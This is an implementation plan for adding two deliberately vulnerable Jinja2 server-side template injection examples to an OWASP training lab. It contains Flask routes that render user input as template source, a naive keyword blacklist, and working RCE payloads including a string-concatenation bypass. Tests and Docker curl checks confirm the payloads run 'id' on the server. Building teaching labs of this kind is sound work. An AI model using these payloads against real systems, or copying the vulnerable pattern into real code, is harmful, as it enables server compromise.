# A03 SSTI (Server-Side Template Injection) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add Jinja2 Server-Side Template Injection (SSTI) as a new vulnerability sub-type under A03, with two graduated examples (Easy direct RCE, Hard naive-blacklist-bypass RCE) in the established four-part content structure.

**Architecture:** Both examples live on the existing `a03_bp` blueprint (`app/categories/a03_injection/routes.py`), no new blueprint needed. Both use Flask's built-in `render_template_string()` — no new dependency. They demonstrate two distinct application features (an email-notification previewer and a profile-bio previewer) that share the identical underlying flaw (`render_template_string(user_input)`), the Hard example additionally showing why a naive keyword blacklist fails to fix it.

**Tech Stack:** Flask 3.0.3, Jinja2 3.1.6 (both already installed — no new dependency), pytest.

**Spec:** docs/superpowers/specs/2026-09-20-owasp-lab-a03-ssi-design.md

## Global Constraints

- No changes to any existing A01/A02/A04/existing-A03 route, model, or template.
- The vulnerable pattern is exactly `render_template_string(user_input)` — Easy example has no filtering at all; Hard example gates the same call behind a naive case-insensitive substring blacklist (`os`, `import`, `exec`, `eval`, `popen`, `subprocess`, `system`) that does not address the underlying flaw. Both verified live (not assumed) against this project's exact Flask 3.0.3 / Jinja2 3.1.6 stack to genuinely achieve RCE via `os.popen(...)`, and the secure pattern (`render_template_string("...{{ name }}...", name=user_input)`) verified live to genuinely neutralize both payloads.
- Every illustrative Jinja `{{ }}`/`{% %}` syntax shown as instructional text inside a `<pre><code>` or inline `<code>` block MUST be wrapped in `{% raw %}...{% endraw %}` — this is this plan's own page-rendering Jinja engine, which would otherwise evaluate the payload text for real instead of displaying it as text. This plan writes every such payload pre-wrapped; no task should paste unwrapped `{{ }}`/`{% %}` into a code-panel or inline-code block. (This is distinct from the XXE-era HTML-angle-bracket escaping constraint — these payloads contain no `<`/`>` characters, so that escaping mechanism isn't triggered here, but stay alert to it if a future task introduces payload text with angle brackets.)
- All Vulnerable-vs-Secure code panels use `language-python` (the shared base template's default via `code_language|default('python')` — no `{% set code_language = ... %}` override is needed anywhere in this plan, since every panel in both new templates is Python code).

---

### Task 1: Easy — SSTI RCE via Custom Email Notification Preview

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/email_preview.html`
- Create: `tests/test_a03_email_preview.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: nothing new.
- Produces: the `email_preview` route/endpoint (`a03_injection.email_preview`), which Task 2 does NOT depend on (Task 2's route is independent, just reuses the `render_template_string` import already added here).

- [ ] **Step 1: Write the failing tests**

Create `tests/test_a03_email_preview.py`:

```python
def test_email_preview_renders_legitimate_greeting(client):
    response = client.post(
        "/a03/email-preview",
        data={"greeting_template": "Hi there, thanks for signing up!"},
    )
    assert response.status_code == 200
    assert b"Hi there, thanks for signing up!" in response.data


def test_email_preview_detect_probe_evaluates_expression(client):
    response = client.post("/a03/email-preview", data={"greeting_template": "{{ 7*7 }}"})
    assert response.status_code == 200
    assert b"49" in response.data


def test_email_preview_ssti_achieves_real_command_execution(client):
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    response = client.post("/a03/email-preview", data={"greeting_template": payload})
    assert response.status_code == 200
    assert b"uid=" in response.data


def test_email_preview_secure_pattern_neutralizes_ssti_payload():
    from flask import Flask, render_template_string

    app = Flask(__name__)
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    with app.app_context(), app.test_request_context():
        result = render_template_string(
            "Hi {{ name }}, thanks for signing up!", name=payload
        )
    assert "uid=" not in result
    assert payload in result


def test_email_preview_static_teaching_text_shows_literal_braces_not_evaluated(client):
    response = client.get("/a03/email-preview")
    assert response.status_code == 200
    body = response.data.decode()
    assert "{{ 7*7 }}" in body
    assert "49" not in body


def test_email_preview_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/email-preview", data={"greeting_template": "Hi there!"}
    )
    assert response.status_code == 200
    assert b"Hi there!" in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_email_preview_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"SSTI" in response.data
    assert b'href="/a03/email-preview"' in response.data
```

Note: `test_email_preview_secure_pattern_neutralizes_ssti_payload` builds its
own tiny standalone Flask app rather than using the `client`/`app` fixtures
— this test is proving a property of the SECURE code pattern shown in the
Vulnerable-vs-Secure panel (which is never actually called by any route in
this app), not testing the app's own routes, so it doesn't need the full
app fixture. This mirrors how the spec's "secure pattern" claim needs its
own direct proof, independent of any route.

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_a03_email_preview.py -v`
Expected: `test_email_preview_secure_pattern_neutralizes_ssti_payload` PASSES already (it doesn't touch the app's routes — this is expected and fine, that test doesn't depend on Task 1's route code). All other tests FAIL — the route doesn't exist yet (404s) or the static teaching text doesn't exist yet.

- [ ] **Step 3: Add the route**

In `app/categories/a03_injection/routes.py`, the current top of the file reads:

```python
import os
import subprocess
import urllib.request

from flask import redirect, render_template, request, session, url_for
from lxml import etree
from sqlalchemy import text

from app.categories.a03_injection import a03_bp
from app.categories.a03_injection.models import Comment, InjectionAccount
from app.extensions import db

XXE_SECRET_PATH = os.path.join(os.path.dirname(__file__), "xxe_secret.txt")
```

Change the `flask` import line to add `render_template_string`:

```python
import os
import subprocess
import urllib.request

from flask import redirect, render_template, render_template_string, request, session, url_for
from lxml import etree
from sqlalchemy import text

from app.categories.a03_injection import a03_bp
from app.categories.a03_injection.models import Comment, InjectionAccount
from app.extensions import db

XXE_SECRET_PATH = os.path.join(os.path.dirname(__file__), "xxe_secret.txt")
```

Then append this route at the end of the file (after the existing
`xxe_ssrf()` route):

```python


@a03_bp.route("/email-preview", methods=["GET", "POST"])
def email_preview():
    greeting_template = ""
    result = None
    error = None
    if request.method == "POST":
        greeting_template = request.form.get("greeting_template", "")
        try:
            # VULNERABLE: render_template_string renders user input as live
            # Jinja template SOURCE, not as inert data -- this app's Jinja
            # environment is not sandboxed, so any Jinja expression syntax
            # submitted here gets evaluated on the server.
            result = render_template_string(greeting_template)
        except Exception as e:
            error = str(e)
    return render_template(
        "a03_injection/email_preview.html",
        greeting_template=greeting_template,
        result=result,
        error=error,
    )
```

- [ ] **Step 4: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, the `examples=[...]` list
currently ends with the `xxe-ssrf` entry and closes like this:

```python
            ExampleNav(
                id="xxe-ssrf",
                title="XXE SSRF via Status Feed Importer",
                group="XML External Entity Injection (XXE)",
                difficulty="Hard",
                endpoint="a03_injection.xxe_ssrf",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

Add a new entry immediately after `xxe-ssrf`, before the closing `],`:

```python
            ExampleNav(
                id="xxe-ssrf",
                title="XXE SSRF via Status Feed Importer",
                group="XML External Entity Injection (XXE)",
                difficulty="Hard",
                endpoint="a03_injection.xxe_ssrf",
            ),
            ExampleNav(
                id="ssti-email-preview",
                title="SSTI RCE via Custom Email Notification Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Easy",
                endpoint="a03_injection.email_preview",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/email_preview.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "SSTI RCE via Custom Email Notification Preview" %}
{% set example_difficulty = "Easy" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "preview your notification email" feature takes the greeting text
  you type and renders it with <code>render_template_string()</code> —
  Flask's helper for rendering a template from a plain string instead of a
  file. The problem: <code>render_template_string()</code> treats its
  argument as actual Jinja template <em>source code</em>, not as inert
  text. Since this app's Jinja environment isn't sandboxed (the default),
  any Jinja expression syntax you submit — including expressions that
  reach Python's own introspection machinery — gets evaluated on the
  server.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit a basic Jinja math expression as your greeting text:
</p>
<pre><code class="language-python">{% raw %}{{ 7*7 }}{% endraw %}</code></pre>
<p>
  If the preview shows <code>49</code> instead of the literal text
  <code>{% raw %}{{ 7*7 }}{% endraw %}</code>, your input is being
  evaluated as a template, not displayed as data — that confirms the bug
  before you ever attempt code execution.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Submit the following as your greeting text:
      <pre><code class="language-python">{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}</code></pre>
  </li>
  <li>The preview shows the real output of the <code>id</code> command,
      run on the server itself — the chain walks from the template's own
      <code>self</code> object through Python's normal object internals
      (<code>__init__</code>, <code>__globals__</code>) to reach the
      interpreter's built-in <code>__import__</code>, then imports
      <code>os</code> and runs an arbitrary shell command.</li>
</ol>
<p>
  Server-Side Template Injection is one of the most severe classes of web
  vulnerability precisely because it usually leads directly to full remote
  code execution on the server — not "just" data theft or a client-side
  script, but the attacker running arbitrary commands with the same
  privileges as the application itself. It's shown up in the wild
  repeatedly in exactly this kind of feature: user-customizable email
  templates, PDF/report generators, and "preview my message" tools that
  pass user text into a template engine instead of treating it as plain
  data — turning a cosmetic personalization feature into full server
  compromise.
</p>
{% endblock %}

{% block vulnerable_code %}result = render_template_string(greeting_template)
{% endblock %}

{% block secure_code %}# Pass user input as a template VARIABLE, never as template SOURCE
result = render_template_string(
    "Hi {% raw %}{{ name }}{% endraw %}, thanks for signing up!", name=greeting_template
)
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Your greeting text</label>
    <textarea class="form-control" name="greeting_template" rows="3"
              placeholder="Hi there, thanks for signing up!">{{ greeting_template }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Preview email</button>
</form>
{% if result %}
<p class="mt-3">Preview: <strong>{{ result }}</strong></p>
{% endif %}
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pytest tests/test_a03_email_preview.py -v`
Expected: all 7 PASS.

- [ ] **Step 7: Update the hardcoded nav-list tests**

Registering the new `ssti-email-preview` entry breaks two pre-existing
tests in `tests/test_a03_overview.py` that hardcode the full A03
nav-entry/group lists — the same pattern the XXE sub-project's
implementation hit and fixed. Open `tests/test_a03_overview.py` and make
these two changes:

In `test_a03_registered_in_nav`, change:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
    ]
```

to:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
    ]
```

In `test_a03_examples_grouped_by_vulnerability_subtype`, change:

```python
    assert [name for name, _ in grouped] == [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "OS Command Injection",
        "XML External Entity Injection (XXE)",
    ]
    assert [e.id for e in grouped[0][1]] == ["sqli-login", "union-exfiltration", "blind-sqli"]
    assert [e.id for e in grouped[1][1]] == ["reflected-xss", "stored-xss"]
    assert [e.id for e in grouped[2][1]] == ["command-injection"]
    assert [e.id for e in grouped[3][1]] == ["xml-import", "xxe-ssrf"]
```

to:

```python
    assert [name for name, _ in grouped] == [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "OS Command Injection",
        "XML External Entity Injection (XXE)",
        "Server-Side Template Injection (SSTI)",
    ]
    assert [e.id for e in grouped[0][1]] == ["sqli-login", "union-exfiltration", "blind-sqli"]
    assert [e.id for e in grouped[1][1]] == ["reflected-xss", "stored-xss"]
    assert [e.id for e in grouped[2][1]] == ["command-injection"]
    assert [e.id for e in grouped[3][1]] == ["xml-import", "xxe-ssrf"]
    assert [e.id for e in grouped[4][1]] == ["ssti-email-preview"]
```

- [ ] **Step 8: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (170 existing + 7 new = 177)

- [ ] **Step 9: Commit**

```bash
git add app/categories/a03_injection/routes.py app/categories/a03_injection/__init__.py \
  app/categories/a03_injection/templates/a03_injection/email_preview.html \
  tests/test_a03_email_preview.py tests/test_a03_overview.py
git commit -m "feat: add A03 SSTI RCE example (Easy)"
```

---

### Task 2: Hard — SSTI Blacklist Bypass via Profile Bio Preview

**Files:**
- Modify: `app/categories/a03_injection/routes.py`
- Modify: `app/categories/a03_injection/__init__.py`
- Create: `app/categories/a03_injection/templates/a03_injection/bio_preview.html`
- Create: `tests/test_a03_bio_preview.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: `render_template_string` import (already added to `routes.py`
  in Task 1).
- Produces: nothing consumed by later tasks — this is the last functional
  change in this plan.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_a03_bio_preview.py`:

```python
def test_bio_preview_renders_legitimate_bio(client):
    response = client.post(
        "/a03/bio-preview",
        data={"bio_template": "Just a regular person who likes hiking."},
    )
    assert response.status_code == 200
    assert b"Just a regular person who likes hiking." in response.data


def test_bio_preview_detect_probe_evaluates_expression(client):
    response = client.post("/a03/bio-preview", data={"bio_template": "{{ 7*7 }}"})
    assert response.status_code == 200
    assert b"49" in response.data


def test_bio_preview_blacklist_blocks_naive_payload(client):
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    response = client.post("/a03/bio-preview", data={"bio_template": payload})
    assert response.status_code == 200
    assert b"uid=" not in response.data
    assert b"Blocked" in response.data


def test_bio_preview_blacklist_bypass_achieves_real_command_execution(client):
    payload = (
        "{{ self.__init__.__globals__.__builtins__['__imp'~'ort__']"
        "('o'~'s').__dict__['pop'~'en']('id').read() }}"
    )
    response = client.post("/a03/bio-preview", data={"bio_template": payload})
    assert response.status_code == 200
    assert b"uid=" in response.data


def test_bio_preview_static_teaching_text_shows_literal_braces_not_evaluated(client):
    response = client.get("/a03/bio-preview")
    assert response.status_code == 200
    body = response.data.decode()
    assert "{{ 7*7 }}" in body
    assert "49" not in body


def test_bio_preview_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post(
        "/a03/bio-preview", data={"bio_template": "Just a regular person."}
    )
    assert response.status_code == 200
    assert b"Just a regular person." in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_bio_preview_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Blacklist Bypass" in response.data
    assert b'href="/a03/bio-preview"' in response.data
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_a03_bio_preview.py -v`
Expected: all FAIL — the route doesn't exist yet (404s).

- [ ] **Step 3: Add the route**

In `app/categories/a03_injection/routes.py`, append this route at the end
of the file (after the `email_preview()` route added in Task 1):

```python


SSTI_BLOCKED_KEYWORDS = ["os", "import", "exec", "eval", "popen", "subprocess", "system"]


@a03_bp.route("/bio-preview", methods=["GET", "POST"])
def bio_preview():
    bio_template = ""
    result = None
    error = None
    if request.method == "POST":
        bio_template = request.form.get("bio_template", "")
        lowered = bio_template.lower()
        blocked_word = next((w for w in SSTI_BLOCKED_KEYWORDS if w in lowered), None)
        if blocked_word:
            error = f'Blocked: template text contains forbidden word "{blocked_word}"'
        else:
            try:
                # VULNERABLE: same render_template_string flaw as email_preview(),
                # "protected" only by a naive substring blacklist above -- that
                # doesn't fix the underlying bug (rendering attacker-controlled
                # text as template source at all), so it's bypassable.
                result = render_template_string(bio_template)
            except Exception as e:
                error = str(e)
    return render_template(
        "a03_injection/bio_preview.html",
        bio_template=bio_template,
        result=result,
        error=error,
    )
```

- [ ] **Step 4: Register the nav entry**

In `app/categories/a03_injection/__init__.py`, the `examples=[...]` list
now ends with the `ssti-email-preview` entry added in Task 1, closing like
this:

```python
            ExampleNav(
                id="ssti-email-preview",
                title="SSTI RCE via Custom Email Notification Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Easy",
                endpoint="a03_injection.email_preview",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

Add the new entry immediately after `ssti-email-preview`, in the same
group, before the closing `],`:

```python
            ExampleNav(
                id="ssti-email-preview",
                title="SSTI RCE via Custom Email Notification Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Easy",
                endpoint="a03_injection.email_preview",
            ),
            ExampleNav(
                id="ssti-blacklist-bypass",
                title="SSTI Blacklist Bypass via Profile Bio Preview",
                group="Server-Side Template Injection (SSTI)",
                difficulty="Hard",
                endpoint="a03_injection.bio_preview",
            ),
        ],
        seed_fn=seed_injection_data,
    )
)
```

- [ ] **Step 5: Create the template**

Create `app/categories/a03_injection/templates/a03_injection/bio_preview.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "SSTI Blacklist Bypass via Profile Bio Preview" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "preview your profile bio" feature has the exact same underlying
  flaw as the email preview example — it renders your submitted bio text
  with <code>render_template_string()</code>, treating it as live Jinja
  template source. As a "security" measure, the server first checks your
  submitted text against a blacklist of forbidden words
  (<code>os</code>, <code>import</code>, <code>exec</code>,
  <code>eval</code>, <code>popen</code>, <code>subprocess</code>,
  <code>system</code>) and refuses to render if any appear. This blocks
  the obvious payload — but it doesn't fix the actual bug, because the
  real problem is rendering attacker-controlled text as template source
  at all, not which specific words appear in it.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit the same basic probe as the email preview example:
</p>
<pre><code class="language-python">{% raw %}{{ 7*7 }}{% endraw %}</code></pre>
<p>
  This contains none of the blocked words, so it sails through the
  blacklist. If the preview shows <code>49</code>, the underlying SSTI bug
  is confirmed — the blacklist only filters specific keywords, not the
  ability to evaluate templates at all.
</p>
{% endblock %}

{% block exploitation %}
<p>
  The straightforward RCE payload from the email preview example is
  blocked here:
</p>
<pre><code class="language-python">{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}</code></pre>
<p>
  It contains the literal words <code>os</code>, <code>import</code>, and
  <code>popen</code>, so the blacklist rejects it before rendering. But
  Jinja2 has a <code>~</code> operator that concatenates strings
  <em>inside the template expression itself</em> — so you can build the
  blocked words at render time instead of writing them literally:
</p>
<ol>
  <li>Submit this instead:
      <pre><code class="language-python">{% raw %}{{ self.__init__.__globals__.__builtins__['__imp'~'ort__']('o'~'s').__dict__['pop'~'en']('id').read() }}{% endraw %}</code></pre>
  </li>
  <li>None of <code>import</code>, <code>os</code>, or <code>popen</code>
      appear as literal substrings in what you submitted —
      <code>'__imp'~'ort__'</code> only becomes the string
      <code>__import__</code> once Jinja evaluates it — so the
      blacklist's substring check passes, and the exact same command
      execution happens as in the email preview example. The preview
      shows the real output of the <code>id</code> command.</li>
</ol>
<p>
  This is the real lesson: blacklisting specific keywords is not a fix
  for SSTI, because the attacker doesn't need to write those keywords as
  literal text — only to cause the interpreter to evaluate them.
  Real-world "security" filters built this way (block a list of scary
  words) have been bypassed the same way in production Flask
  applications; the only real fix is to never render attacker-controlled
  text as template source in the first place.
</p>
{% endblock %}

{% block vulnerable_code %}BLOCKED_WORDS = ["os", "import", "exec", "eval", "popen", "subprocess", "system"]
if not any(word in bio_template.lower() for word in BLOCKED_WORDS):
    result = render_template_string(bio_template)  # still vulnerable -- blacklist doesn't help
{% endblock %}

{% block secure_code %}# Pass user input as a template VARIABLE, never as template SOURCE --
# no blacklist needed, because there's no template source left to filter
result = render_template_string("Bio: {% raw %}{{ name }}{% endraw %}", name=bio_template)
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Your profile bio</label>
    <textarea class="form-control" name="bio_template" rows="3"
              placeholder="Just a regular person who likes hiking.">{{ bio_template }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Preview bio</button>
</form>
{% if result %}
<p class="mt-3">Preview: <strong>{{ result }}</strong></p>
{% endif %}
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pytest tests/test_a03_bio_preview.py -v`
Expected: all 7 PASS.

- [ ] **Step 7: Update the hardcoded nav-list tests**

Registering the new `ssti-blacklist-bypass` entry breaks the same two
tests in `tests/test_a03_overview.py` again — apply the same additive
pattern as Task 1's Step 7.

In `test_a03_registered_in_nav`, change:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
    ]
```

to:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

In `test_a03_examples_grouped_by_vulnerability_subtype`, change:

```python
    assert [e.id for e in grouped[4][1]] == ["ssti-email-preview"]
```

to:

```python
    assert [e.id for e in grouped[4][1]] == ["ssti-email-preview", "ssti-blacklist-bypass"]
```

(The `grouped` list itself — the group *names* — doesn't change in this
step, since both SSTI examples share the same group added in Task 1.)

- [ ] **Step 8: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (177 + 7 = 184)

- [ ] **Step 9: Commit**

```bash
git add app/categories/a03_injection/routes.py app/categories/a03_injection/__init__.py \
  app/categories/a03_injection/templates/a03_injection/bio_preview.html \
  tests/test_a03_bio_preview.py tests/test_a03_overview.py
git commit -m "feat: add A03 SSTI blacklist-bypass example (Hard)"
```

---

### Task 3: Full regression + Docker verification

**Files:**
- None (verification-only task; no code changes expected).

**Interfaces:**
- Consumes: nothing new (verifies Tasks 1–2's combined output).
- Produces: nothing — this is the final task.

- [ ] **Step 1: Run the full suite**

Run: `pytest tests/ -v`
Expected: all PASS (184 tests)

- [ ] **Step 2: Docker end-to-end verification**

```bash
docker compose up --build -d
```

No new dependency was added in this plan, so this build should be a plain
rebuild of the existing image (no new pip package to verify — unlike the
XXE sub-project). Then, via curl against the live container
(`http://127.0.0.1:5001`):

- `/a03/` returns 200 and contains `Server-Side Template Injection (SSTI)`,
  the new group heading.
- `/a03/email-preview` returns 200. POST the detect probe
  (`greeting_template={{ 7*7 }}`) and confirm the response contains `49`.
  Then POST the RCE payload
  (`greeting_template={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`)
  and confirm the response contains `uid=` — this is the first time this
  exact payload is verified against the real container's actual user/
  environment, not just the local dev venv. Cross-check: run
  `docker compose exec app id` and confirm the `uid=` value in the
  container's own environment matches what came back from the SSTI
  payload's response — this proves the command genuinely executed inside
  the container, not some cached/mocked value.
- `/a03/bio-preview` returns 200. POST the naive RCE payload
  (`bio_template={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`)
  and confirm the response does NOT contain `uid=` and DOES contain
  `Blocked` — the blacklist correctly rejects it. Then POST the bypass
  payload
  (`bio_template={{ self.__init__.__globals__.__builtins__['__imp'~'ort__']('o'~'s').__dict__['pop'~'en']('id').read() }}`)
  and confirm the response DOES contain `uid=` this time, matching the
  container's real `id` output — proving the bypass genuinely achieves
  RCE against the live container despite the blacklist.
- `/force-reset` still works cleanly with the new examples in place.

If you have a browser tool available, additionally visit both new example
pages and confirm the Detect/Exploitation/Vulnerable-vs-Secure sections
render with correct syntax highlighting and that every illustrative
`{{ }}`/`{% %}` payload displays as literal text (e.g. the Detect
section's page source should show `{{ 7*7 }}`, not a rendered `49`, and
the page must not have silently evaluated any teaching-text payload). This
is the specific risk this plan's Global Constraints called out for
Jinja-syntax payloads (the sibling risk to XXE's HTML-escaping constraint).
If no browser tool is available, note that as a known gap in your report
rather than skipping the curl-based checks above.

Tear down cleanly afterward:

```bash
docker compose down
```

- [ ] **Step 3: Commit**

No code changes are expected from this task. If the Docker/curl
verification finds nothing to fix, there is nothing to commit — report
DONE with the verification evidence in your report file rather than an
empty commit.
